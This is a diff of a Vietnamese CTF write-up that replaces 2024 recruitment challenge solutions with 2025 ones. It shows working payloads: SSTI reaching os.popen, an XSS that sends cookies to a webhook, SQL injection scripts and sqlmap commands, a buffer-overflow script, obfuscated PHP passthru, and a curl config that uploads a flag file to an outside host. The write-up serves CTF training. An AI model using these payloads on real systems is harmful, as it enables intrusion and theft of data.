@@ -1,321 +1,292 @@
-# kcsc recruitment 2024
+# KCSC Recruitment 2025
 
-## now you see me
+## Login System
 
-### Phân tích 
+### Phân tích
 
-- thấy response trả về có chứa nội dung mà người dùng nhập vào trong param user
+- đọc source code em thấy có 1 danh sách tài khoản đăng nhập và trong đó có admin
 
-==> thử payload SSTI
+![image](https://hackmd.io/_uploads/HJRDK1cD1e.png)
 
-![image](https://hackmd.io/_uploads/SySb7hmTA.png)
+- thấy đăng nhập ứng dụng sử lý so sánh chuỗi PHP Loose Comparison với `==` khi số không sẽ bằng với chuỗi password
 
-==> lỗi ssti thử với {{7*'7'}} ra 7777777 và thấy response server trả về là python ==> jinja2 
-
-
-![image](https://hackmd.io/_uploads/rkkCgxB6R.png)
-
-![image](https://hackmd.io/_uploads/rJ1yWlBTR.png)
-
-![image](https://hackmd.io/_uploads/H1EhbxBTC.png)
+![image](https://hackmd.io/_uploads/Syk5YJ5wJx.png)
 
 ### Khai thác
 
-- https://www.paloaltonetworks.com/blog/prisma-cloud/template-injection-vulnerabilities/
+- em đăng nhập với password là số 0 và được redirect vào dashboard
 
-- Vì mọi thứ đều là đối tượng trong Python, nên một đoạn mã như “{{''.__class__}}” sẽ hiển thị lớp '', tức là “str”.
-- Method Resolution Order (__mro__), thuộc tính này sẽ trả về một bộ các kế thừa và kiểu mà lớp hiện tại được kế thừa.
-- lấy các lớp kế thừa lớp “object” bằng phương thức “__subclasses__” : tiết lộ một danh sách lớn các lớp có thể được sử dụng để tìm mô-đun mà chúng ta đang tìm kiếm
--  sử dụng phương thức “__init__” để tham chiếu đến hàm tạo lớp và sử dụng thêm phương thức “__globals__” để lấy các biến toàn cục của hàm trong khi tìm kiếm một mô-đun cho phép chúng ta thực thi các lệnh trên OS, chúng ta có thể tìm mô-đun “sys”
-- thấy có modun sys
-![image](https://hackmd.io/_uploads/SJAwHeH60.png)
+![image](https://hackmd.io/_uploads/rktnWt_vkx.png)
 
-- dùng đoạn code python sau để tìm modun ```sys```
+![image](https://hackmd.io/_uploads/HJlaZFOvyg.png)
+
+## Check Member
+
+### Phân tích
+
+- đọc source code em thấy param `name` do ta chuyền vào đc nối chuỗi vào câu truy vấn sql
+- và nếu tìm thấy sẽ trả về `'Found :)'` còn không tìm thấy sẽ ` "Not found :("` ==> có thể khai thác boolean base sql injection
+
+![image](https://hackmd.io/_uploads/BkXE21qPJg.png)
+
+- và chuỗi ta nhập vào sẽ đc đếm dấu `(` và phải =< 1 mới được thực hiện truy vấn
+
+### Khai thác
 
 ```python
 import requests
 
-counter = 0
-while True:
-    payload = """{{ ''.__class__.__mro__[1].__subclasses__()[%s].__init__.__globals__['sys'] }}""" % counter
-    url = 'http://157.15.86.73:3004/register'
-    r = requests.post(url, data={"user": payload})
-    
-    if "Welcome " in r.text:
-        print(r.text)
-        print(counter)
-        break
-    
-    counter += 1
+host = "http://36.50.177.41:40009/index.php?name="
+proxy = {'http': 'http://127.0.0.1:8080'}
+
+
+libs = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$()*+,-./:;<=>?@[]^`{|}~_'
+
+flag = ''
+br = False
+index = 1
+for i in range(43):
+    for char in libs:
+        payload = f"' union select flag from secrets where binary substr(flag,{index},1) LIKE '{char}"
+        host_payload = host + payload
+        response = requests.get(host_payload, proxies=proxy)
+        if 'Found :)' in response.text:
+            flag += char
+            index +=1
+            print(flag)
+            break
 ```
 
-![image](https://hackmd.io/_uploads/rk7Zlp76C.png)
+![image](https://hackmd.io/_uploads/BkL_T1qDyg.png)
 
- phát hiện ra rằng lớp con ở chỉ mục 114 là lớp đầu tiên có mô-đun “sys” trong các biến toàn cục của nó.
-
-- dùng payload sau để đọc flag
-
-```
-{{+''.__class__.__mro__[1].__subclasses__()[114].__init__.__globals__['sys'].modules['os'].popen("cat+/flag.txt").read()+}}
-```
-
-![image](https://hackmd.io/_uploads/BJ9eeamp0.png)
-
-## x ec ec
+## giftcard
 
 ### Phân tích
-- đoạn code js xóa các chuỗi "script", "on", "javascript:" ==> encode "script", "on", "javascript:" mà trình duyệt vẫn hiểu để render
 
+- ứng dụng bị Format String Injection khi không có cơ chế validate imput đầu vào của người dùng
 
-![image](https://hackmd.io/_uploads/BJEmR_VaR.png)
+![image](https://hackmd.io/_uploads/ryvhRJ5PJe.png)
 
+- ứng dụng dùng str.format() để định dạng chuỗi xmas_card. Nó thay thế các placeholder trong chuỗi xmas_card bằng các giá trị thực tế được lấy từ thuộc tính của đối tượng card
 
-- encode sang HTML entity
+tham khảo
 
-![image](https://hackmd.io/_uploads/ByPAwxSTC.png)
+- https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
 
-- thử payload sau và thành công trigger 
+### Khai thác
+
+![image](https://hackmd.io/_uploads/r1O1Z1FDke.png)
+
+- `{card.__init__}`: Truy cập phương thức khởi tạo `__init__` của đối tượng card.
+- `{card.__init__.__globals__}`: Truy cập không gian toàn cục nơi `__init__` được định nghĩa.
+- `{card.__init__.__globals__[FLAG]}`: Truy cập giá trị của biến toàn cục FLAG.
+
+## yugioh_shop
+
+### Phân tích
+
+- code trên có thể bị khai thác race condition tại đoạn xử lý kiểm tra số dư và trừ số dư trong tài khoản người dùng:
+
+![image](https://hackmd.io/_uploads/SyTcflcDJg.png)
+
+- Phần kiểm tra số dư `user[3] >= item[2]` và thao tác trừ số dư `query_db("UPDATE users SET balance = balance - ? WHERE id = ?", ...)` không phải là một thao tác nguyên tử không thể bị gián đoạn
+
+- Người dùng có thể gửi nhiều yêu cầu HTTP tới `/buy/<item_id>` một cách đồng thời
+
+nhiều yêu cầu có thể vượt qua điều kiện `user[3] >= item[2]` trước khi giá trị balance bị giảm, dẫn đến việc mua nhiều món hàng mà chỉ bị trừ tiền một lần hoặc không bị trừ đúng số tiền
+
+### Khai thác
+
+- em thực hiện tạo và gửi group request song song
+
+![image](https://hackmd.io/_uploads/rydZLyKDJg.png)
+
+- thấy số tiền bị trừ âm
+- và mua đủ 5 vật phẩm dù số dư không đủ
+
+![image](https://hackmd.io/_uploads/ryRCHytwJg.png)
+
+![image](https://hackmd.io/_uploads/Sk0eUktwkg.png)
+
+![image](https://hackmd.io/_uploads/HyPzU1Ywyx.png)
+
+![image](https://hackmd.io/_uploads/Bka4L1tD1e.png)
+
+## written_by_chatgpt
+
+### Phân tích
+
+- thực hiện đăng ký và em được trả về token sau
+
 ```!
-<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(2)">a</a>
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEwYWM1ZDU1LTllMzAtNDM0My05ZTQwLTI0M2ZmYzA3ZDhiMCIsInVzZXJuYW1lIjoiY3VvbmczIiwiaWF0IjoxNzM3MTkyOTMyLCJleHAiOjE3MzcxOTY1MzJ9.5rdD729_1fMYXDbLv3urogWf_OwMnkUXlW2YFnPz83U
 ```
 
-![image](https://hackmd.io/_uploads/Bk5dMA76A.png)
+![image](https://hackmd.io/_uploads/HyZuSg9wkg.png)
 
-- nhưng nó cần click vào để trigger ==> cần 1 thẻ khác không cần click vào mà vẫn trigger được
+- đọc source code em thấy đc password và id đc tạo ngẫu nhiên với UUID và chúng ta không thể biết password để dăng nhập tài khoản đã tạo
+
+- mục tiêu của chúng ta là đăng nhập được vào tài khoản là có flag
+
+![image](https://hackmd.io/_uploads/HJQmIlqDyg.png)
+
+- và để làm điều này em cần tận dụng được chức năng đặt lại mật khẩu
+- thấy được chức năng đặt lại mật khẩu nhận vào 1 token hợp lệ và `param newPassword`
+- và param `param newPassword` phải có dạng uuid như yêu cầu
+
+![image](https://hackmd.io/_uploads/SkP4vecPJl.png)
+
+![image](https://hackmd.io/_uploads/Skn58gcv1l.png)
 
 ### Khai thác
 
-- dùng payload sau 
+- em thực hiện reset password với token lấy từ response trả về khi đăng ký và password là 1 UUID theo định dạng
 
-```
-<iframe src="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:fetch(`https://webhook.site/12b35fc3-dd67-4e4e-a9fc-42cc53d2fff5?a=${document.cookie}`)"></iframe>
-```
+![image](https://hackmd.io/_uploads/H1Y3UlKwJl.png)
 
+- sau khi đổi mật khẩu thành công, em đăng nhập vào với mật khẩu mới và lấy được flag
 
-![image](https://hackmd.io/_uploads/SynYDCQpR.png)
+![image](https://hackmd.io/_uploads/Sy-iIeYD1x.png)
 
-- khi admin truy cập sẽ gửi request kèm cookie đến webhook của attcker
+![image](https://hackmd.io/_uploads/ByRewxYPyl.png)
 
-![image](https://hackmd.io/_uploads/H1ImwRmpR.png)
-
-
-
-
-```
-<image src="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:fetch(`https://webhook.site/12b35fc3-dd67-4e4e-a9fc-42cc53d2fff5?a=${document.cookie}`)">
-```
-
-
-
-## KCSC x Jujutsu Kaisen
+## Break
 
 ### Phân tích
-- chương trình lấy username từ param username và lấy giá trị đầu trước dấu "." và cho vào câu query
 
-![image](https://hackmd.io/_uploads/Hymka_ETA.png)
+- đọc đoạn code khi đăng ký tài khoản param `username` sẽ được strip() khoảng trắng và dấu tab và so sánh nếu là `admin` thì sẽ trả về `Invalid username`
 
-- vậy có thể khai thác sql injection với ```.jpg``` ở cuối
+![image](https://hackmd.io/_uploads/Hybfte9Dyg.png)
 
-![image](https://hackmd.io/_uploads/ByYm6NVp0.png)
+- thấy khi đăng ký với username là `\r\nadmin` hợp lệ nhưng khi đăng nhập thì nó lại hiểu đó là tài khoản `admin`
 
-```sql
-'+UNION+SELECT+table_name+FROM+information_schema.tables+--+-.jpg
+![image](https://hackmd.io/_uploads/HyOlkVKvyg.png)
+
+![image](https://hackmd.io/_uploads/BynWyEKDJe.png)
+
+- đăng nhập được vào tài khoản admin được điều hướng đến `/home`
+
+- tại đây có chức năng cho phép `curl`
+
+![image](https://hackmd.io/_uploads/rybKSZcDJe.png)
+
+- em curl đến url `file:///flag.txt` và lấy được flag
+
+![image](https://hackmd.io/_uploads/H1vTAmtvJe.png)
+
+## XXD Service
+
+### Phân tích
+
+- ứng dụng cấm các từ khóa `<?php, <?=, exe, sys`
+
+![image](https://hackmd.io/_uploads/BJRZwWqP1g.png)
+
+- để bypass các từ bị cấm em dùng cách viết hoa `phP` và dùng hàm thực thi command khác trong blacklist là `passthru`
+
+![image](https://hackmd.io/_uploads/rk5ru-9wJg.png)
+
+- nhưng lúc mở file bị lỗi parse `xxd`
+
+![image](https://hackmd.io/_uploads/ryeHd-5wke.png)
+
+- `xxd`là một biểu diễn dữ liệu nhị phân theo định dạng mà con người có thể đọc được bằng cách sử dụng ký hiệu thập lục phân. Mỗi byte dữ liệu nhị phân được hiển thị dưới dạng một cặp chữ số thập lục phân
+- và nó lỗi là vì đoạn code php đã được thực thi và nó thực thi command là `00000000` bị lỗi
+- để bypass được parse này em dùng payload sau:
+
 ```
+<?phP   /**/$a="p"/**/."ass"/**/."thr"/**/."u"; /**/$b="c"/**/."at "/**/."/f" /**/."*"; /**/$a($b);
+```
+
+- em sử dụng comment trong php để bypass phần parse hex của xxd,
+- Thêm comment để xxd parse các câu lệnh php của mình nó không bị mất, kết hợp với cộng chuỗi để có thể viết được 1 hàm passthru vào biến `$a`
+- sau đó em ghi command vào biến `$b`
+- Vì trên 1 dòng sẽ có 10 ký tự mà phải trừ đi 4 ký tự `/**/` trên mỗi dòng nên tối đa sẽ sử dụng được 6 ký tự trên 1 dòng
+- Cuối cùng sử dụng `$a($b)` để thực hiện command
+
+![image](https://hackmd.io/_uploads/By0hOrtv1g.png)
+
+- truy cập file vừa upload lên thấy được code php đã thực thi và lấy flag
+
+![image](https://hackmd.io/_uploads/HyGfcHYwJx.png)
+
+## curl_manual
+
+### Phân tích
+
+- đọc đoạn code chương trình:
+
+![image](https://hackmd.io/_uploads/Hki3wX5vkl.png)
+
+- Chạy lệnh curl: Người dùng có thể gửi một tham số (argument) thông qua giao diện web (phương thức POST), và ứng dụng sẽ chạy lệnh curl tương ứng trên máy chủ
+- Biểu thức chính quy `re.search(r'[^a-zA-Z0-9\-\/\ ]', argument)` kiểm tra xem tham số có chứa ký tự không hợp lệ (ngoài chữ cái, số, dấu gạch ngang, gạch chéo, và khoảng trắng).
+- Nếu lệnh chạy thành công, kết quả được hiển thị qua một thông báo flash (Command executed successfully).
+- Nếu xảy ra lỗi khi chạy lệnh, thông báo lỗi (Error executing command) cũng được flash lên.
+
+==> các ký tự như dấu `.` trong ip curl đến sẽ không được
 
 ### Khai thác
-- cần đọc hàm decrypt 
-- payload đọc các hàm trong database như sau
 
-```sql
-SELECT  routine_name FROM information_schema.routines WHERE routine_schema = "jujutsu_kaisen" 
-```
-
-- https://soft-builder.com/how-to-list-stored-procedures-and-functions-in-mysql-database/#:~:text=If%20you%20are%20using%20the,db%20%3D%20'your_database_name'%3B%20command.&text=Listing%20all%20functions%20in%20a,db%20%3D%20'your_database_name'%3B%20command.
-
-![image](https://hackmd.io/_uploads/rJ8YCE46R.png)
-
-lấy được tên hàm DECRYPT: 
-
-- DECRYPT_DIALOGUE_xckQopBS4HrTe8b9<br>
-ENC_DIALOGUE_KR1ebf2RDPIU4dN
-
-cần key giải mã thuật toán mã hóa đối xứng AES
-
-- dùng sqlmap tìm 1 loạt các bảng không thấy key 
-
-```sql
- sqlmap -u "http://157.15.86.73:3002/?username='*-- -.jpg" --batch --threads=10  --risk=3 --level=5   --dbms=MySQL --technique="U" -T users --dump 
-```
- 
-- để ý trong source code có biến key_decrypt ở file index.php ===> cần được file này trên server để lấy key
-
-
-![image](https://hackmd.io/_uploads/SJwA9uN6C.png)
-
-
-
-
-![image](https://hackmd.io/_uploads/Hymka_ETA.png)
-
-- thấy từ input của người dùng ở param username được validate bằng tay và cho vào hàm file_get_contents để đọc file trong thư mục image==> có thể khai thác path traversal ở đây
-
-
-![image](https://hackmd.io/_uploads/HkwAclraA.png)
-
-
-từ thư muc image ra ngoài 1 cấp là đến src chứa index.php
-- đoạn code validate chỉ loại bỏ "./" trong đường dẫn
-- path traversal ```...//index.php``` đọc được source index.php có key_decrypt
- 
- 
- ![image](https://hackmd.io/_uploads/rkGiYuNaC.png)
-
-
-
- 
- ![image](https://hackmd.io/_uploads/r1SuOuNTC.png)
-
-
- key: ```$up3r_$3cr3t_4_$3cur3```
- 
- - gọi hàm decrypt với key decrypt và đọc được flag
-```sql
-'+UNION+SELECT+CONVERT(DECRYPT_DIALOGUE_xckQopBS4HrTe8b9(dialogue,+'$up3r_$3cr3t_4_$3cur3')+USING+utf8)+AS+decrypted_dialogue+FROM+users+WHERE+username+%3d+'toge'+--+-.jpg 
-```
-![image](https://hackmd.io/_uploads/SycqOdNp0.png)
-
-## Base64
-
-```python
-b64 = {
-    "000000": "/",
-    "000001": "+",
-    "000010": "0",
-    "000011": "1",
-    "000100": "2",
-    "000101": "3",
-    "000110": "4",
-    "000111": "5",
-    "001000": "6",
-    "001001": "7",
-    "001010": "8",
-    "001011": "9",
-    "001100": "a",
-    "001101": "b",
-    "001110": "c",
-    "001111": "d",
-    "010000": "e",
-    "010001": "f",
-    "010010": "g",
-    "010011": "h",
-    "010100": "i",
-    "010101": "j",
-    "010110": "k",
-    "010111": "l",
-    "011000": "m",
-    "011001": "n",
-    "011010": "o",
-    "011011": "p",
-    "011100": "q",
-    "011101": "r",
-    "011110": "s",
-    "011111": "t",
-    "100000": "u",
-    "100001": "v",
-    "100010": "w",
-    "100011": "x",
-    "100100": "y",
-    "100101": "z",
-    "100110": "A",
-    "100111": "B",
-    "101000": "C",
-    "101001": "D",
-    "101010": "E",
-    "101011": "F",
-    "101100": "G",
-    "101101": "H",
-    "101110": "I",
-    "101111": "J",
-    "110000": "K",
-    "110001": "L",
-    "110010": "M",
-    "110011": "N",
-    "110100": "O",
-    "110101": "P",
-    "110110": "Q",
-    "110111": "R",
-    "111000": "S",
-    "111001": "T",
-    "111010": "U",
-    "111011": "V",
-    "111100": "W",
-    "111101": "X",
-    "111110": "Y",
-    "111111": "Z",
-}
-
-# Tạo bảng đảo ngược
-reverse_b64 = {v: k for k, v in b64.items()}
-
-def decode(encoded):
-    # Loại bỏ padding nếu có
-    pad = encoded.count('=')
-    if pad > 0:
-        encoded = encoded[:-pad]
-    
-    # Chuyển từng ký tự thành chuỗi nhị phân dựa trên bảng đảo ngược
-    binary_str = ""
-    for char in encoded:
-        binary_str += reverse_b64[char]
-    
-    # Loại bỏ các bit padding đã thêm lúc encode
-    if pad == 1:
-        binary_str = binary_str[:-2]
-    elif pad == 2:
-        binary_str = binary_str[:-4]
-    
-    # Chuyển chuỗi nhị phân thành ký tự ASCII
-    decoded = ""
-    for i in range(0, len(binary_str), 8):
-        decoded += chr(int(binary_str[i:i+8], 2))
-    
-    return decoded
-
-# Chuỗi mã hóa cần giải
-encoded_flag = "gObheRHIpN+wlQ7vqQiQb3XzpAbJn4iv6lR="
-print(decode(encoded_flag))
-# KCSC{no0b_base64_encode!!}
-```
-## basic bof
-
-- thấy đây là file chạy 64 bit
-
-![image](https://hackmd.io/_uploads/r1WgfK4TR.png)
-
-- thấy đoạn code dùng hàm gets để đọc giá trị và có hàm win chứa shell
-
-![image](https://hackmd.io/_uploads/BkfqnerpR.png)
-
-==> buffer overflow và ghi đè giá trị trả về là địa chỉ hàm win để lấy shell
-
-
-```python
-#!/usr/bin/python3.7
-from pwn import *
-
-p = remote('157.15.86.73', 8005) 
-elf = ELF('./chal1') 
-
-win_addr = elf.symbols['win'] + 5
-
-payload = b'A' * 0x100   
-payload += b'B' * 8       # Overwrite saved RBP (not critical)
-payload += p64(win_addr)  
-
-p.sendline(payload)
-
-p.interactive()
+- tham khảo : https://curl.se/docs/manpage.html#-K
+- em upload file avatar với nội dung sau:
 
 ```
+url="https://the3loo85c861vj8k33tidrq4ha8yzmo.oastify.com"
+form = "file=@/app/flag.txt"
+alt-svc = ""
+```
 
-![image](https://hackmd.io/_uploads/HJ-55KEa0.png)
+- với option `--config` :Chỉ định một tệp văn bản để đọc các đối số curl từ đó. Các đối số dòng lệnh được tìm thấy trong tệp văn bản được sử dụng như thể chúng được cung cấp trên dòng lệnh.
+
+- `--form` để upload lên file flag của hệ thống
+- `alt-svc = ""` để ngăn ghi đè Alt-Svc. Vì curl mặc định ghi cache Alt-Svc vào một tệp khi sử dụng các tùy chọn như -K hoặc --config
+
+![image](https://hackmd.io/_uploads/HJwc6W5wJx.png)
+
+![image](https://hackmd.io/_uploads/SkRiaZ9w1e.png)
+
+- em thực hiện curl đến file vừa upload này
+
+![image](https://hackmd.io/_uploads/H1i-AWqPkl.png)
+
+- ứng dụng sẽ curl đến file này và thực hiện upload file flag lên url="https://the3loo85c861vj8k33tidrq4ha8yzmo.oastify.com"
+
+![image](https://hackmd.io/_uploads/BJQl0WcwJx.png)
+
+## s1mple
+
+### Phân tích
+
+- đọc đoạn code em thấy đoạn username biến user sẽ được gán từ mảng USERS["đối số username ta chuyền vào"] và cần nó là các giá trị truthy thì có thể vượt qua (Số khác 0, Chuỗi không rỗng, Đối tượng và mảng {}, ())
+
+![image](https://hackmd.io/_uploads/Skp9gJ2vJl.png)
+
+- vậy chỉ cần user là 1 đối tượng và trong js có thuộc tính **proto** để chỉ đến nguyên mẫu của nó cũng là 1 đối tượng
+
+![image](https://hackmd.io/_uploads/ByAFZ12wyl.png)
+
+- thêm vào đó nếu giá trị password đầu vào là falsy thì sẽ bằng với giá trị của mảng đối tượng vì object này ko có thuộc tính password
+
+![image](https://hackmd.io/_uploads/B136gkhDkl.png)
+
+- và để password chúng ta nhập vào undefined thì em không nhập password
+
+![image](https://hackmd.io/_uploads/SJHAlk3Dyg.png)
+
+- sau khi đăng nhập em có được token admin
+
+- và tại /admin sẽ lấy các key và hiển thị ra thông tin với chuỗi template được render bởi template engine
+
+![image](https://hackmd.io/_uploads/S1F1ZJ3DJx.png)
+
+- tham khảo: https://eslam.io/posts/ejs-server-side-template-injection-rce/
+
+- chèn giá trị key là payload ssti và em lấy được flag
+
+![image](https://hackmd.io/_uploads/ryMxZJhPyl.png)
+
+![image](https://hackmd.io/_uploads/ryMZ-ynD1g.png)
+
+![image](https://hackmd.io/_uploads/HJ6b-knvye.png)
+
+![image](https://hackmd.io/_uploads/SySfbknDJx.png)
